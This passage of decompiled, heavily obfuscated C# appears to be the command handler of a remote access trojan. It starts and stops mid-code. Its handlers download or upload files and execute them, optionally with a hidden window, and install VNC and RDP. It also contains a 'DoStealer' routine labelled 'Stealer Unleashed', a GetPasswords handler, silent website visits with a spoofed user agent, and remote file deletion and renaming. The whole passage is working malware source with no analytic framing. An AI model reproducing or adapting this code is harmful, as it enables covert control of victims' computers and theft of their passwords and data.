      if (ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩菌笎趒毝둢.\u26F4\u25ABз큺\u2F2D皮楛䃃샘M퇅턣ꇤ葀殯\u2FC2釼\uFFFD裞ꖚ && !string.IsNullOrEmpty(ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩菌笎趒毝둢.\uEF3E瑁\u177Eᤩ\uE492奩쑘퇊嶥冴쫌䃃벘抾ꢼ菗㔜剂\uF7D7낈))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(ḁ谸롃ᦚ䌉閿잁臫穹ᩞ畩菌笎趒毝둢.\uEF3E瑁\u177Eᤩ\uE492奩쑘퇊嶥冴쫌䃃벘抾ꢼ菗㔜剂\uF7D7낈, true).Execute(client);
      }
    }
  }

  public static void ꍕ簥ꂹﴗ糈\uF167\uFFFD\uFFFDƚ\uF36Cজ\u3017\uFFFD睕\uE36C젱辥\uFFFD뷘\u0EAC(
    DoDownloadFile command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uFDD9Ợஒ\uE7F9\uEE15煵뗸湭崭ज़짡ʒ\u2AA0뚒镅䠉و穠\uF721쯘()
    {
      壛迀萚\uF0B8架ⲷ\uE52A\uF756两擐蒗좨墲爅飏钽鱏\u249C钲쇲 = command,
      䍎㪱蓳崏뱥ⴃ貧䐃䆷ិॆ蒶ꊳꁓ䙀抯\uE00Fឰڂ䄈 = client
    }.쉏锭쮓ᒽ奔画쒗ڮ\uF15D肽瘩䛀횈钴加ꫵ禢唘肁硳)).Start();
  }

  public static void \u1376喛태偞炚陑\u27DD헩\uF831抂喙儹踎㓔ꭹ檫㘰鈰\u9FF1ඩ(
    DoDownloadFile command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.懳㼙ṟ郘퍡\u09FB\uFFFDㆊ㴜潡ꓒ싩ࣷ\uE338\u24DC숛寫\uE324毣ヶ()
    {
      잚櫆啾㗪\u0E92ధ兒㸬엞坓ႀᰤ\u2FE6꯸\u2A47が\uF756ꊒ\uF4F9\uEED4 = command,
      밮웭犩뜜䎊ꣴ츋뚋埐㭜ॄ혽ᥔ\uFFFD䲜泙ᮅ뒙뷬\u27A6 = client
    }.\u1BEFꕯ㩝묰ᯚ扯䡎棸\uE7EF\u33BF䉪\uF2B6ᣝ蛸睶姤\uFFFD\uE2B3鶵쳾)).Start();
  }

  public static void ꇣ눆垌첗ᔤ\uE5D6\uF73E\u0B54姫ꛕᖾ뚑\uE987粇횵\u2855夨ᦝࢣ\uE113(
    DoDownloadFileCancel command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\u0033ၛ餰궐ꮬ눥\uDB8C\uDE6E럧\u1B69雺当\u10CB誧\uFFFD략홾\u02FD\uEDA5脒.ContainsKey(command.ID))
      return;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\u0033ၛ餰궐ꮬ눥\uDB8C\uDE6E럧\u1B69雺当\u10CB誧\uFFFD략홾\u02FD\uEDA5脒.Add(command.ID, "canceled");
    new DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
  }

  public static void \u31C1\u26BE鼾늂矋괿龰\u2990䅆囮돨裃毢冞ᒾ\uE84D炂\uFFFD\uF19Cٓ(
    DoUploadFile command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    if (command.CurrentBlock == 0 && System.IO.File.Exists(command.RemotePath))
      \u2524ꍔ㻌䭣ǖ岓\uEE62꼩岠\uFFFD\u2E04꺅\u0F31ᮮ￺\u31BC袼쒲㒞誠.謼뾗\u3308\u204F쓛\u26D2\u2B18\uE191穞皝놞\uE6EF祕ᤃ迫ᱲ잋⁢啍빧(command.RemotePath);
    new ۼ薈깐㦡\uE0D2ﱾ綱\uFAFDή⃒蔦띌\u2320瀮\uE91F껧଼遃瞫都(command.RemotePath).㳨䣙쇶냷舚퍋䪨䎝婒潂\uE642꣔\u2451끯\uF437ᱯᝏ物\u0EA4켪(command.Block, command.CurrentBlock);
  }

  public static void 宪㵖\uF2AB돠땔鸮᭓\u2A48ї\uEA76䕷ﰖ莧湲鐷貲凭䰽赸삋(
    DoPathDelete command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.硐天蘛밮ᝯ\uFFFD\u0EDB㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿 硐天蘛밮ᝯ㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿 = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.硐天蘛밮ᝯ\uFFFD\u0EDB㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿();
    // ISSUE: reference to a compiler-generated field
    硐天蘛밮ᝯ㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿.劓\uF5BE䊃婢뒋\uE0B3ᖝ닸\u00A2暎䩅訔\u23E6눀ꗡ\u2213唐ٟ늅컓 = false;
    // ISSUE: reference to a compiler-generated field
    硐天蘛밮ᝯ㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿.嗙瑥䕉裲㸁飢釽ᐖ늞愳팗옽䏰턲\u005C뵂睄굣\uA9C6鮂 = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(硐天蘛밮ᝯ㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿.\uF005엗죩㰣\uFFF8홝蔌곥\uF76D\uF4E9\uF754ି㙲\u0FC0\u2F28\uEBE5䛭戼祟굄);
    try
    {
      switch (command.PathType)
      {
        case 媰\uE940\u32E5㳢짓\u086E\uECB2唦鯺\uFFFD车\uE71B宄厊傏갲긏륌\uE82Cא.\uFFFD햮䎿鑋躄ύ\u0B79齐窏銮푅얩胯\u1AA4ￏ슶쬀ꈊ營䲅:
          System.IO.File.Delete(command.Path);
          new SetStatusFileManager("Deleted file", false).Execute(client);
          break;
        case 媰\uE940\u32E5㳢짓\u086E\uECB2唦鯺\uFFFD车\uE71B宄厊傏갲긏륌\uE82Cא.卜츫놆\uFFFD帡㛵\u22AB\u31BE뜫瓀訁\u0085檷摓啠寨Ṭ\uE3E5計봆:
          Directory.Delete(command.Path, true);
          new SetStatusFileManager("Deleted directory", false).Execute(client);
          break;
      }
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.즥갵㷞긧\u2B25뾖惌嘍놶ʿ૪蚞菝菱㢠\u236F如\uE596\uFFFD\u0DF5(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("DeletePath No permission");
    }
    catch (PathTooLongException ex)
    {
      action("DeletePath Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("DeletePath Path not found");
    }
    catch (IOException ex)
    {
      action("DeletePath I/O error");
    }
    catch (Exception ex)
    {
      action("DeletePath Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (硐天蘛밮ᝯ㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿.劓\uF5BE䊃婢뒋\uE0B3ᖝ닸\u00A2暎䩅訔\u23E6눀ꗡ\u2213唐ٟ늅컓 && !string.IsNullOrEmpty(硐天蘛밮ᝯ㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿.嗙瑥䕉裲㸁飢釽ᐖ늞愳팗옽䏰턲\u005C뵂睄굣\uA9C6鮂))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(硐天蘛밮ᝯ㲊ѓᥲ互柚䱬Ʝ걬绋㴓ޏ枍텿.嗙瑥䕉裲㸁飢釽ᐖ늞愳팗옽䏰턲\u005C뵂睄굣\uA9C6鮂, false).Execute(client);
      }
    }
  }

  public static void 䴎䎹㫗甘ଂ씙㐏黳ᩖ奍Őꡙ飌뚉頓븷ᴷ爅ᖰ珩(
    DoPathRename command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.鄵蛑裸퐨핿杧鏇벟\uFFFD祝ؗ\uF83B\uF8BC狭卛೦桠帅厯뺅 鄵蛑裸퐨핿杧鏇벟祝ؗ狭卛೦桠帅厯뺅 = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.鄵蛑裸퐨핿杧鏇벟\uFFFD祝ؗ\uF83B\uF8BC狭卛೦桠帅厯뺅();
    // ISSUE: reference to a compiler-generated field
    鄵蛑裸퐨핿杧鏇벟祝ؗ狭卛೦桠帅厯뺅.\u3359\u2B2Bཿ檘\u2F5A\u2967ᨈ\u089F昃埲\uED2Fॸ\uEBDA辷籛璴ڃ뾶犂꿄 = false;
    // ISSUE: reference to a compiler-generated field
    鄵蛑裸퐨핿杧鏇벟祝ؗ狭卛೦桠帅厯뺅.㧁專䊴흫쐶皨\u196F괗폎᪇䵞攜䶓\uFFFD\uEDA7塵娆\uF590筨\uFFFD = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(鄵蛑裸퐨핿杧鏇벟祝ؗ狭卛೦桠帅厯뺅.\u259F雰䴐ꆠ蛼䵠\uF34E\uEC5A\uEE9C贒\uE02E莬\u23A0\uE375\uA7C0튮დ瓰껥ὺ);
    try
    {
      switch (command.PathType)
      {
        case 媰\uE940\u32E5㳢짓\u086E\uECB2唦鯺\uFFFD车\uE71B宄厊傏갲긏륌\uE82Cא.\uFFFD햮䎿鑋躄ύ\u0B79齐窏銮푅얩胯\u1AA4ￏ슶쬀ꈊ營䲅:
          System.IO.File.Move(command.Path, command.NewPath);
          new SetStatusFileManager("Renamed file", false).Execute(client);
          break;
        case 媰\uE940\u32E5㳢짓\u086E\uECB2唦鯺\uFFFD车\uE71B宄厊傏갲긏륌\uE82Cא.卜츫놆\uFFFD帡㛵\u22AB\u31BE뜫瓀訁\u0085檷摓啠寨Ṭ\uE3E5計봆:
          Directory.Move(command.Path, command.NewPath);
          new SetStatusFileManager("Renamed directory", false).Execute(client);
          break;
      }
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.즥갵㷞긧\u2B25뾖惌嘍놶ʿ૪蚞菝菱㢠\u236F如\uE596\uFFFD\u0DF5(new GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("RenamePath No permission");
    }
    catch (PathTooLongException ex)
    {
      action("RenamePath Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("RenamePath Path not found");
    }
    catch (IOException ex)
    {
      action("RenamePath I/O error");
    }
    catch (Exception ex)
    {
      action("RenamePath Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (鄵蛑裸퐨핿杧鏇벟祝ؗ狭卛೦桠帅厯뺅.\u3359\u2B2Bཿ檘\u2F5A\u2967ᨈ\u089F昃埲\uED2Fॸ\uEBDA辷籛璴ڃ뾶犂꿄 && !string.IsNullOrEmpty(鄵蛑裸퐨핿杧鏇벟祝ؗ狭卛೦桠帅厯뺅.㧁專䊴흫쐶皨\u196F괗폎᪇䵞攜䶓\uFFFD\uEDA7塵娆\uF590筨\uFFFD))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(鄵蛑裸퐨핿杧鏇벟祝ؗ狭卛೦桠帅厯뺅.㧁專䊴흫쐶皨\u196F괗폎᪇䵞攜䶓\uFFFD\uEDA7塵娆\uF590筨\uFFFD, false).Execute(client);
      }
    }
  }

  public static void 鴘䰷\uE95D燚啹\u2B14蕙ോ\uF3B1ਨ\u4DE5\uE0ED锴䘧ꥪ䈊更䲾\uF461ꨪ(
    DoDownloadAndExecute command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\u2FA5恞휮莘\uF794橊\uF8E1겭\u22ABƂ䃶\uE75B꺹퇣岈振U\u0C4E\uF0DE耱 恞휮莘橊겭Ƃ䃶꺹퇣岈振U耱 = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\u2FA5恞휮莘\uF794橊\uF8E1겭\u22ABƂ䃶\uE75B꺹퇣岈振U\u0C4E\uF0DE耱();
    // ISSUE: reference to a compiler-generated field
    恞휮莘橊겭Ƃ䃶꺹퇣岈振U耱.\uFFFD쾜粤輻ዮ偾尖ﾴ골㚰㟿ؠ\uFFFD퓴痪\uF6C2블ⳉӗ\u0FD8 = command;
    // ISSUE: reference to a compiler-generated field
    恞휮莘橊겭Ƃ䃶꺹퇣岈振U耱.맧\u2EE8\u0E78ְ\u12D7兕쭑\u0F0A靍屢竹轔ˮ㟨鏝쯩ⷛ\uF284\u0E60ᅊ = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Downloading file...").Execute(恞휮莘橊겭Ƃ䃶꺹퇣岈振U耱.맧\u2EE8\u0E78ְ\u12D7兕쭑\u0F0A靍屢竹轔ˮ㟨鏝쯩ⷛ\uF284\u0E60ᅊ);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(恞휮莘橊겭Ƃ䃶꺹퇣岈振U耱.穗얕崗ᾜⴀꪗ㠬潪쨴庆ᵹ\u0FDF\u29A9竆蟜\uFFFDᏝ폖\uEFE3쳑)).Start();
  }

  public static void 쏯\uF58B犍\uE405減ᄏ閇\uA6F4毹醱㖠厫ỻ\u0EF1ᚺ\uEA1Fอ㮶ﱅ狍(
    DoInstallVNC command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF3C7ௗ䁼অ捇冀瓥轸\uEB97ﵨ凨닍\u1ADE\uF1C4獑鄤꽙\uEC62純\uFFFD obj = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uF3C7ௗ䁼অ捇冀瓥轸\uEB97ﵨ凨닍\u1ADE\uF1C4獑鄤꽙\uEC62純\uFFFD();
    // ISSUE: reference to a compiler-generated field
    obj.魩䭤豼㮘ᶽ㷽Օ聰Ɛ蚶풗䩿燽\uF0D4ᦡ螾\u2730䞜景\u177C = command;
    // ISSUE: reference to a compiler-generated field
    obj.㤾\uE200음瘱츞俓槠䔆䋔ڞ伳뤦찧䋛瑆緁䚨惻뻊㭥 = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Installing VNC...").Execute(obj.㤾\uE200음瘱츞俓槠䔆䋔ڞ伳뤦찧䋛瑆緁䚨惻뻊㭥);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(obj.龞샮鯽\u23D7鷧䱮\uEC64뗹匍㴫\uEFE4ꊄ汆䘽ﺓ븥粃\u1C80六뒖)).Start();
  }

  public static void 介\u0D54ꌊ욄꩕랾䵙ỳ쯡꤂\u214D\uE3C0㜛ᡖ㞦㞦簩䕄勞\uE916(
    DoInstallRDP command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\u32A3醥諠堑\uE09Cᠦ鎈짬캟ஷ곐컁㚰\u33E9ፎ㰺\u2A99쩣㖃\uF024 醥諠堑ᠦ鎈짬캟ஷ곐컁㚰ፎ㰺쩣㖃 = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\u32A3醥諠堑\uE09Cᠦ鎈짬캟ஷ곐컁㚰\u33E9ፎ㰺\u2A99쩣㖃\uF024();
    // ISSUE: reference to a compiler-generated field
    醥諠堑ᠦ鎈짬캟ஷ곐컁㚰ፎ㰺쩣㖃.য়鉉\uF580䒏陦段킆ၡܑ㝛䓦譒塬\u33D6\uF7B7㓔邱\u2A87\uFFFD宜 = command;
    // ISSUE: reference to a compiler-generated field
    醥諠堑ᠦ鎈짬캟ஷ곐컁㚰ፎ㰺쩣㖃.ẘ\u2903嶧뇟\u0EE2謦鍲欨û䯥픸募\u2422\u1CD3ឋ੬岰苷횎蓪 = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Installing RDP...").Execute(醥諠堑ᠦ鎈짬캟ஷ곐컁㚰ፎ㰺쩣㖃.ẘ\u2903嶧뇟\u0EE2謦鍲欨û䯥픸募\u2422\u1CD3ឋ੬岰苷횎蓪);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(醥諠堑ᠦ鎈짬캟ஷ곐컁㚰ፎ㰺쩣㖃.ܪ\uFFFD䗨沽\uA4CF꿉\uEA79ꖝꮜ\u09D5䇶Ω宲㬀㻥\u2514徴䜢轟枊)).Start();
  }

  public static void 祌\u268E\u2979芷\uE738鏖\u28AB憜ㅽ\u332B邼壣꧓᩿鮆\uF4FB\uEABF屁㘘ࠈ(
    DoStealer command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.鮀ᐣ\u0F48䛽腎ꭇ\u0F85\uFDE0䶗撳ॾ箧萿ោᏺ衑鸕䚤쿫\uF180 鮀ᐣ䛽腎ꭇ䶗撳ॾ箧萿ោᏺ衑鸕䚤쿫 = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.鮀ᐣ\u0F48䛽腎ꭇ\u0F85\uFDE0䶗撳ॾ箧萿ោᏺ衑鸕䚤쿫\uF180();
    // ISSUE: reference to a compiler-generated field
    鮀ᐣ䛽腎ꭇ䶗撳ॾ箧萿ោᏺ衑鸕䚤쿫.㩢꣘抍㲫ᜯ福\uF6F3翩\uF216ꢽ哓탶痈\uE433룙縱\uF48Eꅖ鋖隥 = command;
    // ISSUE: reference to a compiler-generated field
    鮀ᐣ䛽腎ꭇ䶗撳ॾ箧萿ោᏺ衑鸕䚤쿫.姻ᚐ릓䅒爅\u2ABE娓剸헖緖ᙳ\u2A6D㗹婩縷賣仂缃輺乙 = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Stealer Unleashed....").Execute(鮀ᐣ䛽腎ꭇ䶗撳ॾ箧萿ោᏺ衑鸕䚤쿫.姻ᚐ릓䅒爅\u2ABE娓剸헖緖ᙳ\u2A6D㗹婩縷賣仂缃輺乙);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(鮀ᐣ䛽腎ꭇ䶗撳ॾ箧萿ោᏺ衑鸕䚤쿫.膔㹶ព㗕䎈㻮ㅩ䀆\u4DB7櫛ᘥ\u21B5\uEAB0磖\uF4A1\uE5A1\u1758䧽馼쾣)).Start();
  }

  public static void \uFAFC䆺\uEB4B稥ꯈ瘫챳\uED3D\u19FC\u2B14\u21B6\uFAF3ု堺쬞\uF889秝隐벂麅(
    DoUploadAndExecute command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    if (!쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.ContainsKey(command.ID))
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.Add(command.ID, \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.\uE0F1\uE1AF\u240D蹾㳝Ỳ숯菎핡쑸\u3360牜쾩燌\u3218骈\uE5BB\uFFFD유Ꝑ(Path.GetExtension(command.FileName)));
    string str = 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢[command.ID];
    try
    {
      if (command.CurrentBlock == 0 && Path.GetExtension(str) == ".exe" && !\uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.鷣抈ឈ䑔\uFFFD讣찚㗀\u21BD켨뉡뿞㾢纃礳\uFFFD\uE016튢\u2417\uEB00(command.Block))
        throw new Exception("No executable file");
      ۼ薈깐㦡\uE0D2ﱾ綱\uFAFDή⃒蔦띌\u2320瀮\uE91F껧଼遃瞫都 ۼ薈깐㦡ﱾ綱Ή⃒蔦띌瀮껧଼遃瞫都 = new ۼ薈깐㦡\uE0D2ﱾ綱\uFAFDή⃒蔦띌\u2320瀮\uE91F껧଼遃瞫都(str);
      if (!ۼ薈깐㦡ﱾ綱Ή⃒蔦띌瀮껧଼遃瞫都.㳨䣙쇶냷舚퍋䪨䎝婒潂\uE642꣔\u2451끯\uF437ᱯᝏ物\u0EA4켪(command.Block, command.CurrentBlock))
        throw new Exception(ۼ薈깐㦡ﱾ綱Ή⃒蔦띌瀮껧଼遃瞫都.LastError);
      if (command.CurrentBlock + 1 != command.MaxBlocks)
        return;
      if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.ContainsKey(command.ID))
        쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.Remove(command.ID);
      \uF19D䫆䖭縤괒渚\u29BB㥽ⴐ곰䥛\uEBFA\uF31A\uEC2C\uF8FC吅ᣮ\uE9D3ꋼ綄.䏀녂\uF572馘熹\uE9C3瑊à妪ゲ㯝峰欓뒪\uE279ꆿ띙\uE576\uF857\uECFD(str);
      ProcessStartInfo startInfo = new ProcessStartInfo();
      if (command.RunHidden)
      {
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.CreateNoWindow = true;
      }
      startInfo.UseShellExecute = false;
      startInfo.FileName = str;
      Process.Start(startInfo);
      new SetStatus("Executed File!").Execute(client);
    }
    catch (Exception ex)
    {
      if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.ContainsKey(command.ID))
        쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢.Remove(command.ID);
      \u2524ꍔ㻌䭣ǖ岓\uEE62꼩岠\uFFFD\u2E04꺅\u0F31ᮮ￺\u31BC袼쒲㒞誠.謼뾗\u3308\u204F쓛\u26D2\u2B18\uE191穞皝놞\uE6EF祕ᤃ迫ᱲ잋⁢啍빧(str);
      new SetStatus("Execution failed: " + ex.Message).Execute(client);
    }
  }

  public static void 悼ᘚ묍棔䏛潢畖䍚ᕤ깽禒踥쥫\u125F摏谛嵠㠜\u2708\u0C5D(
    DoVisitWebsite command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    string str = command.URL;
    if (!str.StartsWith("http"))
      str = "http://" + str;
    if (!Uri.IsWellFormedUriString(str, UriKind.RelativeOrAbsolute))
      return;
    if (!command.Hidden)
    {
      Process.Start(str);
    }
    else
    {
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(str);
        httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
        httpWebRequest.AllowAutoRedirect = true;
        httpWebRequest.Timeout = 10000;
        httpWebRequest.Method = "GET";
        using ((HttpWebResponse) httpWebRequest.GetResponse())
          ;
      }
      catch
      {
      }
    }
    new SetStatus("Visited Website").Execute(client);
  }

  public static void 肦ꯚ綛\u0DBE㙧昏Ⱊထ牆슨ꐢ繛氭닱ٝଋ븐㙡ﮤዶ(
    DoShowMessageBox command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\uFFFD䂨漨經\uE175증廷\uF2C7п쓆\u24EC왗ꃞ\u32BE寸\u2EBAѤឿ苠層()
    {
      艹\uFFFD膀豶\uFFFD檷藍㔈ᖈ羝䑸\u2A46粮唧\uE787뛎령㻹\uFFFD栌 = command
    }.肋躴龖眑ᅻ䚗ᴦ㳤ۘ\u230D\uF3FA岳䂝쓮\uE15Dᡯ篰셝䪓\uFFFD)).Start();
    new SetStatus("Showed Messagebox").Execute(client);
  }

  public static void \u2FAC\u2389뾇ⲗ憙뎻ฮꌡ\uE81B\uF527좊먡슙쀠\uE576\u19F0\uFFFD\uEA23봧葸(
    GetPasswords packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    List<띱\uEE59\uF5AD\uEF8Eચ饶\uE0BDࢭ흽尋騄驪\u2E2E겐쬓\uF2C3\u4DD0軤\u2B43䂫> 띱ચ饶ࢭ흽尋騄驪겐쬓軤䂫List = new List<띱\uEE59\uF5AD\uEF8Eચ饶\uE0BDࢭ흽尋騄驪\u2E2E겐쬓\uF2C3\u4DD0軤\u2B43䂫>();
    List<string> data = new List<string>();
    for (int index = 0; index < 띱ચ饶ࢭ흽尋騄驪겐쬓軤䂫List.Count; ++index)
    {
